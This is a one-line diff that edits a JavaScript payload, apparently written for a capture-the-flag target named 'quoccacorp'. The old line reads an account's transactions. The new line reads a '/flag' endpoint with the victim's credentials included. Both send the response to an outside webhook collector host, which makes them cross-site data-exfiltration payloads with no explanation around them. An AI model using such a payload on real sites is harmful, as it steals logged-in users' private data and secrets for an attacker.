@@ -1,1 +1,1 @@
-fetch('https://api.netquocca.quoccacorp.com/accounts/1/transactions').then(function(r){return r.text()}).then(function(t){fetch('https://bold-galaxy-05.webhook.cool/',{method:'POST',mode:'no-cors',body:t})}).catch(function(e){fetch('https://bold-galaxy-05.webhook.cool/',{method:'POST',mode:'no-cors',body:String(e)})})
+fetch('https://api.netquocca.quoccacorp.com/flag',{credentials:'include'}).then(function(r){return r.text()}).then(function(t){fetch('https://bold-galaxy-05.webhook.cool/',{method:'POST',mode:'no-cors',body:t})})
